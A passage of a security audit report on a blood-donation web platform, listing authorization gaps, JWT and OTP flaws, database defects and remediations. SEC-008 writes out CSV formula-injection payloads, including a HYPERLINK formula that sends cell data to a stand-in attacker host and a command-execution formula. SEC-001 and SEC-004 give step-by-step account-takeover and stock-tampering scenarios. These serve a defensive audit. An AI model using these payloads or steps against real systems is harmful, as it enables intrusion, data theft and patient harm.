| **API-011** | P2 | `StockUpdateRequest.java:15` | `action` is a free-form `String` with no enum constraint | Enables BE-118's silent-`default` data loss |
| **API-012** | P2 | `EmergencyRequestCreateRequest.java:16`, `EmergencyRequest.java:31` | `emergencyLevel` is a `String` in both DTO and entity, while `Urgency` is a proper enum elsewhere | Typo-prone; no validation of legal values |
| **API-013** | P2 | `NotificationRepository.java:22-25` | `markAllAsReadByUserId` is a `@Modifying` JPQL bulk update with **no `@Transactional`** on the caller path guaranteeing flush ordering, and no `clearAutomatically` | Stale persistence-context reads within the same transaction |
| **API-014** | P3 | `AppointmentUpdateRequest.java` | Exists but wired to **no endpoint** | Spec §2 requires rescheduling; the DTO suggests it was planned and abandoned |
| **API-015** | P3 | `EmergencyOtpRequest.java` | Exists, wired to nothing — the abandoned SMS-OTP flow | Dead DTO |
| **API-016** | P3 | `common/dto/PageResponse.java`, `ApiResponse.java`, `ErrorDetail.java` | All three are **empty files**; the API has no envelope type and `GlobalExceptionHandler` builds an ad-hoc `Map` | Every error response shape is hand-rolled and inconsistent with the intended envelope |
| **API-017** | P2 | `api/emergencyApi.ts:29-30`; `bloodRequestApi.ts:33-39`; `appointmentApi.ts:87-92` | The client sends `requiredDate` (unknown to `BloodRequestCreateRequest`), and `donorId` + `scheduledAt` (both unknown to `AppointmentCreateRequest`, and the backend derives the donor from the JWT) | Relies on Jackson `FAIL_ON_UNKNOWN_PROPERTIES` being disabled rather than sending a clean contract |

**REST conformance summary:** HTTP verbs are used sensibly and `201`/`400`/`404`/`409` are broadly correct. The failures are the **absence** of pagination, versioning, rate limiting and idempotency, plus the pervasive absence of authorisation.

---

## 8. Authentication & Authorization Issues

### 8.1 Attack scenarios evaluated against the actual code

| # | Scenario | Result | Evidence |
|---|---|---|---|
| 1 | **Unauthenticated user calls a protected API** | **403, not 401.** The frontend's 401-refresh logic never fires | `SecurityConfig` sets no `exceptionHandling`/entry point and enables no `httpBasic`/`formLogin` → Spring's default `Http403ForbiddenEntryPoint`. Frontend gates on `status === 401` (`axios.ts:97`) |
| 2 | **Normal user calls an admin API** | Correctly blocked | `AdminController.java:18`, `AdminUserController.java:16` — `@PreAuthorize("hasRole('ADMIN')")` |
| 3 | **Donor forges a donation for another user** | **ALLOWED.** `POST /api/donations` has no principal at all | `DonationController.java:26` → `DonationService.java:60-88` |
| 4 | **Any user cancels any donation / appointment / blood request** | **ALLOWED.** No ownership check on any of the three | `DonationController:52`, `BloodRequestController:76,82`, `EmergencyRequestController:51` |
| 5 | **Any user completes any appointment** | **ALLOWED.** `completeAppointment` receives **no principal whatsoever** | `AppointmentController:66` → `AppointmentService:145` |
| 6 | **Any user edits any hospital's details** | **ALLOWED.** `PUT /api/hospitals/{id}` has no `@PreAuthorize` and no ownership check | `HospitalController:55` → `HospitalService:84` (the only `@PreAuthorize` in the class is on `DELETE`, L64-65) |
| 7 | **Any user inflates or zeroes any hospital's blood stock** | **ALLOWED.** Zero authorisation on the entire inventory controller | `InventoryController:41,50,60` |
| 8 | **Any user overwrites any donor's GPS coordinates** | **ALLOWED.** `PUT /api/donors/{donorId}/location` has no principal | `MatchingController:76` → `MatchingService:159` |
| 9 | **Any user reads any donor's DOB, weight, gender and precise location** | **ALLOWED** | `UserController:114` → `DonorProfileResponse` (health data) |
| 10 | **Any user reads any donor's contribution history / badges / rank** | **ALLOWED** | `DonorContributionController:38-64` |
| 11 | **Any user deletes any notification** | **ALLOWED** | `NotificationController:57` → `NotificationService:78` |
| 12 | **Changing your own role via a request payload** | **BLOCKED.** `AuthService.java:111-113` rejects `ADMIN`; no role-update endpoint exists; `UpdateUserRequest` carries only names and phone. **This vector is genuinely closed** |
| 13 | **Reusing an expired token** | Blocked by jjwt's `exp` validation in `parseSignedClaims` | `JwtUtils.java:105-109` |
| 14 | **Unauthenticated user obtains tokens for an arbitrary account** | **ALLOWED — see SEC-001** | `EmergencyOtpController.java:79-81, 104-106` |
| 15 | **Modifying a request payload to escalate** | **ALLOWED** on ~35 endpoints via the IDORs above | §8.2 |

### 8.2 Consolidated authorization map (extracted from source)

`@PreAuthorize` appears **3 times in the entire backend** — 2 class-level on `/api/admin`, 1 method-level on `DELETE /api/hospitals/{id}`. Everything else is governed solely by `anyRequest().authenticated()`.

**Endpoints with NO role check and NO ownership check (any authenticated user, any role):**

| Method | Path | Controller:Line | Consequence |
|---|---|---|---|
| POST | `/api/donations` | `DonationController:26` | Forge donations for any donor/hospital/group |
| GET | `/api/donations` | `:32` | Read the entire donation ledger |
| GET | `/api/donations/{id}` | `:38` | IDOR |
| PATCH | `/api/donations/{id}/cancel` | `:52` | Cancel any donation, incl. COMPLETED (BE-103) |
| GET | `/api/appointments` | `AppointmentController:35` | Read all appointments |
| GET | `/api/appointments/{id}` | `:41` | IDOR |
| GET | `/api/donors/{donorId}/appointments` | `:47` | IDOR |
| GET | `/api/hospitals/{hospitalId}/appointments` | `:53` | IDOR |
| PATCH | `/api/appointments/{id}/complete` | `:66` | Complete any appointment — **no principal** |
| PUT | `/api/hospitals/{id}` | `HospitalController:55` | Edit any hospital |
| POST | `/api/hospitals` | `:46` | Any role (incl. DONOR) can create a hospital |
| GET | `/api/hospitals/{id}/blood-requests` | `:79` | IDOR |
| POST | `/api/hospitals/{hospitalId}/inventory` | `InventoryController:41` | **Any user can add stock to any hospital** |
| PUT | `/api/hospitals/{hospitalId}/inventory/{inventoryId}` | `:50` | **Any user can SET any hospital's stock** |
| PATCH | `/api/hospitals/{hospitalId}/inventory/{inventoryId}/stock` | `:60` | **Any user can ADD/DEDUCT/SET** |
| GET | `/api/hospitals/{hospitalId}/inventory/**` | `:26,32,70,79` | Read any hospital's stock |
| PUT | `/api/donors/{donorId}/location` | `MatchingController:76` | Overwrite any donor's GPS |
| GET | `/api/donors/{donorId}/location` | `:70` | Read any donor's precise GPS |
| GET | `/api/donors/nearby` | `:85` | Bulk-read donor names + **phone numbers** by radius |
| GET | `/api/donors/{donorId}/{contributions,donations,milestones,badges,statistics}` | `DonorContributionController:38-64` | IDOR ×5 |
| GET | `/api/users/donors/{id}` | `UserController:114` | **Health-data disclosure** (DOB, weight, gender, GPS) |
| PUT | `/api/blood-requests/{id}` | `BloodRequestController:67` | Edit any request |
| PATCH | `/api/blood-requests/{id}/cancel` | `:76` | Cancel any request |
| PATCH | `/api/blood-requests/{id}/fulfill` | `:82` | Mark any request FULFILLED |
| POST | `/api/emergency-requests` | `EmergencyRequestController:25` | Create an emergency on any blood request |
| POST | `/api/emergency-requests/{id}/alert-donors` | `:45` | Trigger a (stubbed) broadcast on any emergency |
| PATCH | `/api/emergency-requests/{id}/resolve` | `:51` | Close any emergency |
| GET | `/api/emergency-requests`, `/{id}` | `:33,39` | Read **patient/relative phone numbers** |
| DELETE | `/api/notifications/{id}` | `NotificationController:57` | Delete any notification |

**Total: 33 endpoint/verb combinations confirmed with neither a role check nor an ownership check.**

### 8.3 Authentication-mechanism defects

| ID | Severity | File:Line | Issue |
|---|---|---|---|
| **AUTH-001** | **P0** | `JwtUtils.java:57-70` + `JwtAuthenticationFilter.java:52-70` | **A refresh token is a valid access token.** `generateRefreshToken` sets only `sub/iat/exp`; the filter validates only the signature and `sub`. There is **no `typ`/`token_type` claim and no claim-presence check**. A refresh token (valid **7 days**) authenticates every protected endpoint exactly like an access token (24 h). Conversely, an access token is accepted by `/api/auth/refresh` |
| **AUTH-002** | **P0** | `EmergencyEmailOtpService.java:104-115` | **OTP attempt lockout completely defeated by transaction rollback.** `verify()` is `@Transactional`; on a wrong OTP it calls `record.incrementAttempt()`, `otpRepository.save(record)`, then **throws `OtpException` (a `RuntimeException`)**. The transaction rolls back and **the increment is discarded**. `if (record.getAttemptCount() >= record.getMaxAttempts())` can therefore **never become true**. `EMAIL_OTP_MAX_ATTEMPTS=5` provides **zero** protection. *(See §9 SEC-003 for the full vulnerability write-up.)* |
| **AUTH-003** | **P1** | `JwtUtils.java` | **No `jti`, no revocation list, no server-side session.** A token is valid until `exp` with no invalidation path. Logout is client-side only; there is no logout endpoint. Blocking a user works only because the filter re-reads `user.isActive()` per request — the *token* remains valid |
| **AUTH-004** | **P1** | `JwtUtils.java:34-55` | **24-hour access tokens.** No short-lived access token + rotation model. A stolen `localStorage` token is valid for a full day with no revocation path |
| **AUTH-005** | **P1** | `AuthService.java:211-255` | **No refresh rotation, no reuse detection.** The same refresh token replays indefinitely for 7 days; the endpoint returns the *same* token back |
| **AUTH-006** | **P1** | `AuthService.java:184-209` | **`login()` never calls `validateUserCanAuthenticate`.** That method checks `isActive()` and `status == BLOCKED` (`:410-423`) but is only invoked from `refreshToken` and `getCurrentUser`. `DaoAuthenticationProvider` only consults `UserPrincipal.isEnabled()` → `active`. A user with `status = BLOCKED` but `active = true` can log in. `FirebasePhoneAuthService` *does* check (`:76-78`) — applied inconsistently |
| **AUTH-007** | **P1** | `AuthService.java:63-64, 275-281` | **Password-reset tokens live in an in-process `ConcurrentHashMap`.** Lost on restart, not shared across instances (horizontal scaling silently breaks reset), never garbage-collected (expired entries removed only when presented), and **not invalidated by a password change** |
| **AUTH-008** | **P1** | `AuthService.java:257-284` | **No rate limiting on `/api/auth/forgot-password`** → unlimited SMTP relay abuse / mail-bombing, plus in-memory map growth per request |
| **AUTH-009** | **P1** | `AuthService.java:286-322` | **Reset does not revoke outstanding tokens and does not require the current password.** A session stolen before a reset remains valid |
| **AUTH-010** | **P1** | `AuthController.java:71-79` + `UnconfiguredProductionEmailService` | `forgotPassword` returns 200 unconditionally (correct anti-enumeration) — **but `UnconfiguredProductionEmailService` throws `IllegalStateException` → HTTP 500 with the raw message** in the default profile. This turns a correct 200 into a 500 and **reveals that the account exists** (enumeration oracle) |
| **AUTH-011** | **P1** | `AuthService.java:110-113` + `RegisterRequest.role` | `role` is client-supplied. `ADMIN` is correctly rejected, but `HOSPITAL` is **self-service with zero verification** — `licenseDocumentUrl` is accepted and discarded, and `Hospital.verified` is never set by any code path. An unvetted hospital account can immediately manipulate blood inventory |
| **AUTH-012** | P2 | `CustomUserDetailsService.java:23-28` | `UsernameNotFoundException("User not found with email: " + email)` embeds the input in the message; if it ever reaches a client it becomes an account-existence oracle. Currently masked by `AuthService.login`'s generic 401 |
| **AUTH-013** | P2 | `CorsConfig.java:19-21, 38` | CORS hardcoded to `http://localhost:5173` with `allowCredentials(true)`. **No prod origin configuration.** The correct pattern (explicit origins) is used, so there is **no wildcard-origin bug** — this is a *deployment blocker*, not an injection |
| **AUTH-014** | P2 | `SecurityUtils.java:19-24, 54-66` | `isAuthenticated`, `hasRole`, `getCurrentUserId`, `getCurrentUserEmail` are **never used**. A misleading abstraction — every service hand-rolls its own `SecurityContextHolder` access |
| **AUTH-015** | — | `SecurityConfig.java:35` | CSRF disabled globally. **Justified** for a stateless Bearer-token API with no cookies — **not scored as a defect.** It becomes a real CSRF risk the moment `localStorage` is replaced with cookies without also adding CSRF tokens (see the SEC-010 remediation) |
| **AUTH-016** | **P1** | `common/firebase/FirebaseAdminConfig.java` | **The entire file is commented out.** No `FirebaseAuth` bean is ever created, so `FirebaseTokenService.verify` always hits `firebaseAuth == null` → `IllegalStateException` → **HTTP 500**. `POST /api/auth/firebase/phone` is `permitAll` and therefore **publicly reachable and permanently broken** |
| **AUTH-017** | P2 | `FirebasePhoneAuthService.java:82-93` | Auto-provisions a `Role.DONOR` user with **no `DonorProfile`**, no blood group, and a synthetic `{uid}@firebase-phone.invalid` email. The new donor's `GET /api/users/donor-profile` returns 404 and they are invisible to matching until they self-register |

---

## 9. Security Vulnerabilities

> **No secrets are reproduced in this document. All secret values are masked.**

### SEC-001 — Unauthenticated account takeover via the emergency SOS endpoint
- **Severity: P0** · CWE-287 (Improper Authentication), CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Location:** `Red-Pulse Backend/red-pulse/src/main/java/com/redpulse/modules/request/controller/EmergencyOtpController.java:74-129`, granted by `config/SecurityConfig.java:53-55`
- **Vulnerability:** The endpoint `/api/emergency/verify-and-dispatch` is in the `permitAll` list. It mints valid access **and** refresh JWTs for whichever account the caller names.
- **Evidence:**
  - Line 79: `emailOtpService.consumeVerification(payload.getVerificationId(), payload.getEmail(), cleanPhone);` — the OTP is bound to `(email, phoneNumber)`.
  - **Line 81:** `User requester = userRepository.findByPhone(cleanPhone).orElseGet(() -> createRequester(payload, cleanPhone));` — the account is selected by the **attacker-supplied `payload.getPhone()`**.
  - **Lines 104-106:** `jwtUtils.generateAccessToken(principal)` and `generateRefreshToken(principal)` are minted for that account and returned in the response body.
  - **Lines 117-129 (`createRequester`):** a *second* vector — `userRepository.findByEmail(email)` returns an **existing** user of any role, including `ADMIN`, and tokens are minted for it.
  - Neither branch checks `isActive()` / `UserStatus.BLOCKED` (contrast `FirebasePhoneAuthService:76-78`).
- **Attack scenario:**
  1. Attacker requests an OTP for `email = attacker@evil.com`, `phoneNumber = +91 9XXXXXXXXX` where the phone belongs to a target (an admin's number is in `users.phone_number` and is frequently discoverable). The OTP is delivered to the **attacker's** inbox.
  2. Attacker verifies the OTP → receives a `verificationId`.
  3. Attacker POSTs `/api/emergency/verify-and-dispatch` with that `verificationId`, their own email, **the target's phone number**, and any blood group. The verification's phone check passes because it echoes the phone used in step 1.
  4. The response contains a valid **admin access token and refresh token**. The attacker is now an administrator.
  5. **Variant:** an attacker with read access to any account's **email** obtains tokens for that account via `createRequester`'s `findByEmail` branch — no phone knowledge needed.
- **Impact:** Complete administrative compromise of a platform holding donor medical data (blood group, DOB, weight, GPS) and hospital blood-stock records. Regulatory exposure under any health-data regime.
- **Precondition:** Requires `EMAIL_OTP_ENABLED=true` and working SMTP. **This is not set in the committed `.env`** (it defaults to `false`, so `ensureConfigured()` throws) — meaning the flow is *currently dead*, but `.env.example:35` ships `EMAIL_OTP_ENABLED=true`, so it becomes live the moment an operator follows the documented setup. This makes it a **latent production P0**, not a theoretical one.
- **Remediation:** (a) **Delete token minting from this endpoint entirely** — an anonymous SOS must not authenticate anyone. (b) If a session is genuinely required, provision a **fresh, purpose-scoped, short-lived** principal and never resolve an existing account by email or phone. (c) Require the OTP to be bound to the *phone* (SMS), not the email, or bind the verification to a one-time, single-purpose grant record. (d) Move the orchestration out of the controller into a service that cannot access `JwtUtils`.

### SEC-002 — Refresh token accepted as an access token
- **Severity: P0** · CWE-287
- **Location:** `common/security/JwtUtils.java:57-70`; `common/security/JwtAuthenticationFilter.java:52-70`
- **Evidence:** `generateRefreshToken` emits only `sub/iat/exp`. The filter calls `extractUserId` and `isTokenValid` — neither inspects claim presence or type. No `typ` claim exists anywhere in `JwtUtils`.
- **Attack scenario:** Any 7-day refresh token (from `localStorage`, a shared device, a support screenshot, a proxy log) is used directly as `Authorization: Bearer <refreshToken>` against any protected endpoint.
- **Impact:** The 7-day window bypasses the 24-hour access-token limit, defeating the primary containment of a stolen token. **Compounds SEC-001.**
- **Remediation:** Add a mandatory `typ: "access"|"refresh"` claim; reject in the filter when `typ != "access"`; reject in `AuthService.refreshToken` when `typ != "refresh"`. Add `jti` + a denylist, or refresh-token rotation with reuse detection.

### SEC-003 — OTP brute-force protection defeated by transaction rollback
- **Severity: P0** · CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **Location:** `modules/request/service/EmergencyEmailOtpService.java:104-115`
- **Evidence:** `@Transactional public Map<String,Object> verify(...)`. The failure branch executes:
  ```java
  record.incrementAttempt();
  otpRepository.save(record);
  ...
  throw new OtpException("OTP_INVALID", "Invalid OTP.", 400);
  ```
  `OtpException extends RuntimeException`, so Spring rolls the transaction back and **the increment is discarded**.
- **Attack scenario:** Submit unlimited 6-digit guesses against a live `verificationId`. `attemptCount` never increments durably, so `maxAttempts` (default 5) is never reached. ~500,000 online guesses suffice — and there is **no rate limit on `/api/emergency/otp/verify`** (SEC-005).
- **Impact:** Defeats the sole authentication factor protecting SEC-001, converting it from "requires an email inbox" into "requires a few hundred thousand HTTP requests".
- **Remediation:** Increment the counter in a **separate `REQUIRES_NEW` transaction** (or a native `UPDATE emergency_email_otps SET attempt_count = attempt_count + 1`) before throwing. Add rate limiting on the verify endpoint. **Write the failing test first.**

### SEC-004 — Complete absence of authorization on blood-inventory mutation
- **Severity: P0** · CWE-862 (Missing Authorization), CWE-639
- **Location:** `modules/inventory/controller/InventoryController.java:41,50,60` → `InventoryService.java:60,66,90`
- **Evidence:** The `@PreAuthorize` count in the whole backend is 3, none on this controller. `updateStock` and `addOrInitializeInventory` accept any `hospitalId` path variable and there is **no principal parameter at all**.
- **Attack scenario:** A newly registered DONOR calls `PATCH /api/hospitals/{id}/inventory/{iid}/stock` with `{"units":0,"action":"SET"}` → a hospital's O-negative stock reads CRITICAL. Or `{"units":9999,"action":"SET"}` → reads ADEQUATE. A REQUESTER can do the same to every hospital. Combined with the `default → SET` behaviour (BE-118), even a malformed action overwrites stock.
- **Impact:** **Patient-level clinical harm.** Emergency dispatch decisions are driven by stock availability; a donor can fabricate or destroy the blood supply of every hospital on the platform, and **nothing in the audit log records it** (BE-126, SEC-007).
- **Remediation:** `@PreAuthorize("hasRole('HOSPITAL')")` + verify `hospital.user.id == currentUserId`; restrict ADMIN to read-only plus a separately audited adjustment with a mandatory reason.

### SEC-005 — No rate limiting anywhere in the application
- **Severity: P1** · CWE-307, CWE-770
- **Location:** Global — verified zero occurrences of Bucket4j, resilience4j, or any custom throttling filter
- **Evidence:** `SecurityConfig.java` contains no rate-limit filter; no such bean exists.
- **Attack scenario:** Credential stuffing against `/api/auth/login` (no lockout, no CAPTCHA, no IP throttle). Mass account creation via `/api/auth/register`. Mail-bombing via `/api/auth/forgot-password`. Brute-forcing `/api/emergency/otp/verify`. Resource exhaustion via the unpaginated list endpoints.
- **Impact:** Multiple independent paths to compromise and to denial of service.
- **Remediation:** Add a token-bucket filter (Bucket4j) keyed on IP + account, with distinct budgets for auth, OTP, and read endpoints. Add per-account lockout with exponential backoff.

### SEC-006 — Backend stack traces and SQL detail returned to clients
- **Severity: P1** · CWE-209 (Generation of Error Message Containing Sensitive Information)
- **Location:** `common/exception/GlobalExceptionHandler.java:82-91`
- **Evidence:** `error.put("message", ex.getMessage())` in the catch-all handler, returned with HTTP 500.
- **Attack scenario:** Trigger a constraint violation (e.g. duplicate `registration_number` via BE-115) and read the returned message: it names the constraint, the table, the column and often the conflicting value — a precise map of the schema, plus absolute filesystem paths in some cases. The frontend's `looksInternal()` filter (FE-045) is bypassed by calling the API directly.
- **Remediation:** Log the exception with a correlation ID; return a generic message plus the ID. Never serialise `getMessage()` for `Exception.class`.

### SEC-007 — No audit trail for compliance-critical actions
- **Severity: P1** · CWE-778 (Insufficient Logging)
- **Location:** `common/audit/AuditAspect.java`, `AuditEventPublisher.java`, `LoggableAction.java` — **all three are empty (0 bytes)**; `modules/admin/service/AdminService.java:96-101` is the only writer
- **Evidence:** Only 4 actions are ever logged: `USER_BLOCKED`, `USER_UNBLOCKED`, `DONOR_VERIFIED`, and `recordAudit`. Grep confirms `AuditAspect`/`LoggableAction`/`AuditEventPublisher` have **0 references**. `ipAddress` is hardcoded to `"127.0.0.1"`.
- **Not logged:** every stock adjustment (`STOCK_ADJUSTED`), every donation completion (`DONATION_COMPLETED`), every login, every role change, every emergency resolve, every request fulfil — all explicitly required by spec §3/§6.
- **Impact:** The `/admin/audit-logs` page presents a table that is simultaneously **incomplete and falsified** (fabricated IPs). There is no non-repudiation for stock discrepancies, no forensic trail for SEC-004, and the spec's compliance claim is unmet.
- **Remediation:** Implement the AOP audit aspect; derive the client IP from `WebAuthenticationDetailsSource` (already captured on the `Authentication` in `JwtAuthenticationFilter:82-85`); make `audit_logs` append-only (revoke `UPDATE`/`DELETE` from the app role).

### SEC-008 — CSV formula injection in admin exports
- **Severity: P1** · CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)
- **Location:** `modules/admin/service/AdminService.java:104-113, 189-231`
- **Evidence:** `String.format` writes raw `hospitalName`, `city`, `description`, donor names and notes into CSV with no neutralisation and (in 6 of 7 reports) no quoting.
- **Attack scenario:** A HOSPITAL user sets its name via the **unauthenticated** `PUT /api/hospitals/{id}` (scenario 6) to `=HYPERLINK("http://evil/?"&A1,"click")` or `+cmd|'/c calc'!A1`. When an ADMIN downloads `/api/admin/reports/hospitals` and opens it in Excel/Sheets, the formula executes — enabling data exfiltration or command execution on the compliance officer's workstation.
- **Impact:** Code execution / data theft on an administrator's machine, triggered by a lower-privileged user's input.
- **Remediation:** Prefix any field starting with `= + - @ TAB CR` with `'`; RFC-4180 quoting for all fields; serve with `Content-Type: text/csv; charset=utf-8` and `X-Content-Type-Options: nosniff`.

### SEC-009 — JWT and database credentials stored in plaintext on disk
- **Severity: P2** · CWE-312 (Cleartext Storage of Sensitive Information)
- **Location:** `Red-Pulse Backend/red-pulse/.env:11` (masked: `DB_PASSWORD=A*******`), `:15` (masked: `JWT_SECRET=****…`, a valid base64 256-bit HS256 key), `:25-27` (Firebase project id, client email, PEM header)
- **Evidence:** `git check-ignore` confirms `.env` **is** correctly ignored and **is not tracked** — good. However the key is a real, working, fixed secret in the working tree, and `.env.example:14` ships `JWT_SECRET=your_jwt_secret_key_here`, which decodes to <32 bytes and makes `Keys.hmacShaKeyFor` throw `WeakKeyException` at startup.
- **Attack scenario:** The file syncs via OneDrive to other devices and cloud backups; readable by any process running as the developer; if ever committed (`git add -f`), **every token in the system is forgeable** — an attacker can mint an `ADMIN` token for any UUID.
- **Remediation:** Generate secrets per environment via a secret manager; never reuse across environments; make the app **fail fast with a clear message** if `JWT_SECRET` is absent or shorter than 32 bytes; replace the `.env.example` placeholder with a generation instruction.

### SEC-010 — Access and refresh tokens in `localStorage`
- **Severity: P2** · CWE-922 (Insecure Storage of Sensitive Information)
- **Location:** `src/api/axios.ts:20-56`; `src/context/AuthContext.tsx:31, 66`
- **Evidence:** `localStorage.setItem(STORAGE_KEYS.accessToken, …)`. `index.html` loads Google Fonts from a third-party CDN and **no CSP is set anywhere** (verified: no `contentSecurityPolicy` in the backend or frontend).
- **Attack scenario:** Any XSS anywhere in the app yields both tokens for 7 days. There is no CSP to blunt injection.
- **Impact:** Token theft → full account takeover, amplified by SEC-002 (refresh token = access token).
- **Remediation:** `httpOnly; Secure; SameSite=Strict` refresh-token cookie + short-lived access token in memory; add a strict CSP (`default-src 'self'`) and self-host fonts to remove the third-party script surface. **Note:** this makes CSRF tokens necessary (see AUTH-015).

### SEC-011 — No Content-Security-Policy or equivalent hardening headers
- **Severity: P2** · CWE-693
- **Location:** `config/SecurityConfig.java` — no `.headers(...)` configuration
- **Evidence (precise):** Spring Security's `HeaderWriterFilter` supplies `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Cache-Control: no-store` and HSTS-on-HTTPS by default, so those are **not** missing. What is genuinely absent: **Content-Security-Policy** (never a Spring default), `Referrer-Policy`, `Permissions-Policy`, `Cross-Origin-Opener-Policy`. There is also no HSTS because nothing terminates TLS in this repository.
- **Remediation:** Configure an explicit CSP and referrer policy; terminate TLS and enable HSTS at the edge.

### SEC-012 — IP-based rate limiting is bypassable or collapsing behind a proxy
- **Severity: P2** · CWE-348
- **Location:** `modules/request/service/EmergencyEmailOtpService.java:70-77`; `EmergencyOtpController.java:61-64`
- **Evidence:** `httpRequest.getRemoteAddr()` is passed as `ip` and used for `countByIpAddressAndCreatedAtAfter`. There is **no `server.forward-headers-strategy`** setting anywhere (verified), so behind a load balancer every request appears to originate from the proxy's IP — collapsing all clients into one bucket (20 requests/hour blocks *everyone*), or, if a naive `X-Forwarded-For` parse is later added, becoming trivially spoofable.
- **Remediation:** Set `server.forward-headers-strategy=framework` and use `ForwardedHeaderFilter` / `Request.getRemoteAddr()` after it; validate the trusted-proxy hop count.

### SEC-013 — API surface disclosure in production
- **Severity: P2** · CWE-200
- **Location:** `config/SecurityConfig.java:58-61`
- **Evidence:** `/swagger-ui/**` and `/v3/api-docs/**` are `permitAll` with no profile guard.
- **Impact:** Full API surface disclosure in production, including the SEC-001 endpoint's exact request shape.
- **Remediation:** Restrict to the `dev` profile, or gate behind an authenticated `ADMIN` role.

### Items explicitly checked and found NOT vulnerable

Reported for balance and to show the audit was not one-directional:

| Class | Result |
|---|---|
| SQL injection | **Not present.** 100% parameterised JPA / Spring Data derived methods. No string-concatenated SQL anywhere (verified across all 102 files) |
| Command injection | **Not present.** No `Runtime.exec` / `ProcessBuilder` |
| SSRF | **Not present.** No outbound HTTP from user-supplied URLs |
| Path traversal / file upload | **Not present.** There is no file-upload endpoint at all (the frontend licence upload is a no-op — FE-132) |
| Unsafe deserialization | **Not present.** Jackson with POJOs only |
| Hardcoded secrets in tracked files | **None.** A full-repo regex scan for Google API keys, Stripe keys, private keys, GitHub/Slack/AWS tokens and JWTs returned **zero hits in tracked files** |
| ADMIN self-registration | **Blocked** (`AuthService:111-113`) |
| Role escalation via payload | **Blocked** — no role-update endpoint exists |
| Expired-token acceptance | **Blocked** by jjwt `exp` validation |
| Wildcard CORS | **Not present** — explicit origin list used (though hardcoded to localhost) |

---

## 10. Database Issues

### 10.1 Schema assessment

The Flyway baseline is **structurally sound**: 10 tables, proper `UUID` PKs with `gen_random_uuid()`, real foreign keys with deliberate `ON DELETE` semantics (`CASCADE` for dependent records, `SET NULL` for optional parents), sensible `CHECK` constraints on quantities, and 30+ indexes including composite and partial ones. This is above-average DDL discipline for a project at this stage. The problems are in what is **missing** and in entity/schema disagreement.

| ID | Severity | Issue | Evidence |
|---|---|---|---|
| **DB-001** | **P1** | **No `blood_inventory.expiry_date` and no `reserved_units`** | `V2` defines only `quantity_units`. Spec §3 Entity 4 mandates "units available, units reserved, expiration timestamp". Blood-product expiry is a core safety control; `getExpiringUnits` returns `[]` because the data cannot exist (BE-102) |
| **DB-002** | **P1** | **No `blood_requests.units_fulfilled`** | `V3` has `units_required` only. Spec §6 step 6.2 requires "units_fulfilled increments (transitions to FULFILLED)" — `DonationService.verifyDonation` never touches the parent request, so **`PARTIALLY_FULFILLED` and `FULFILLED` are unreachable by the automated cascade** and can only be set by the unauthenticated `PATCH /{id}/fulfill` |
| **DB-003** | P2 | **No `total_donations` on `donor_profiles`** | Spec §6 step 6.3. Recomputed by scanning donations on every read (PERF-004) |
| **DB-004** | **P1** | **No optimistic locking (`@Version`) on any of the 11 entities** | Verified: zero occurrences. Every read-modify-write is exposed to lost updates — `blood_inventory` (BE-105, BE-119), `donations`, `donor_profiles`. The only lock in the codebase is a `PESSIMISTIC_WRITE` on the OTP row |
| **DB-005** | **P1** | **No index on `users.phone_number`** | Yet `UserRepository.findByPhone` is on the SEC-001 takeover path, the Firebase login path, and the emergency dispatch path — **the hottest security-critical lookup in the system**, doing a sequential scan |
| **DB-006** | P2 | Missing indexes on `donations.appointment_id`, `appointments.blood_request_id`, `notifications(reference_type, reference_id)` | All are join/lookup columns used by `existsByDonorIdAndBloodRequestIdAndStatusIn` and the reminder de-duplication query |
| **DB-007** | P2 | `V4` DDL `donations.status DEFAULT 'COMPLETED'` vs entity default `SCHEDULED` | BE-111 |
| **DB-008** | P2 | `donor_profiles.blood_group NOT NULL` in DDL but `nullable` in the entity | Two sources of truth disagree; `DonorProfileResponse` defensively null-checks code the schema forbids, while `DonorContributionService`/`AdminService` dereference without a check (BE-123) |
| **DB-009** | P2 | `hospitals.user_id` has `ON DELETE SET NULL` while `appointments`/`donations`/`blood_inventory` **cascade from `hospitals`** | Deleting a hospital row would cascade-delete its appointments, donations **and inventory records** — silent clinical-record loss. Currently unreachable (soft delete only), but the FK graph is a loaded gun |
| **DB-010** | P2 | No `CHECK` constraints on any enum column (`role`, `status`, `blood_group`, `urgency_level`) | Integrity rests entirely on the application layer; a bad insert corrupts reads with `IllegalArgumentException` → 500 |
| **DB-011** | P2 | `V6__add_indexes_and_constraints.sql` is a **0-byte migration** | A no-op in the chain; suggests a dropped/renamed migration, which is exactly how the Flyway checksum drift happened (BE-003) |
| **DB-012** | P2 | `V9` uses `ADD COLUMN IF NOT EXISTS` / `CREATE INDEX IF NOT EXISTS` | An anti-pattern in *versioned* Flyway migrations — silently masks schema drift and makes the migration non-deterministic |
| **DB-013** | P2 | No retention/cleanup job for `notifications`, `audit_logs`, or `emergency_email_otps` | Unbounded growth on the three tables most likely to be written at volume. `emergency_email_otps` holds bcrypt hashes and IP addresses indefinitely — a data-minimisation issue |
| **DB-014** | P3 | `updated_at` columns have DB defaults but are JPA-managed via `@PreUpdate`; no DB trigger | Rows updated outside JPA leave `updated_at` stale |
| **DB-015** | P3 | `updated_at TIMESTAMP` (no time zone) everywhere, written with `LocalDateTime.now()` | Server-local timestamps; ambiguous across regions and hostile to audit (BE-134). Use `TIMESTAMPTZ`/`Instant` |
| **DB-016** | P3 | `emergency_requests.blood_request_id NOT NULL UNIQUE` contradicts spec §3 Entity 6 ("optionally to a parent BloodRequest") | Doc/impl mismatch; the model is strictly 1:1 |
| **DB-017** | P3 | No seed-data migration; the only bootstrap is the optional `DataInitializer` admin account | A fresh environment has no roles, no reference data, and — unless `ADMIN_BOOTSTRAP_ENABLED=true` — **no way to create the first admin**, because public registration correctly refuses `ADMIN`. Undocumented |

### 10.2 Transactions

**Done well:** `@Transactional` is applied consistently at the service layer, and `readOnly = true` is used appropriately.

**Problems:**
- `@Transactional` appears on a **controller** (`EmergencyOtpController.java:75`) — a layering violation that also means the transaction spans HTTP deserialisation and response construction.
- **No `@Transactional(propagation = REQUIRES_NEW)`** anywhere — the direct cause of SEC-003.
- `DonationService.verifyDonation` performs a **multi-entity write cascade** (donation status + inventory increment + donor profile + appointment status + up to 4 notifications) inside one transaction with **no compensating logic and no locking**. Correct as far as it goes, but the absent `@Version` means concurrent completions both commit (BE-105).
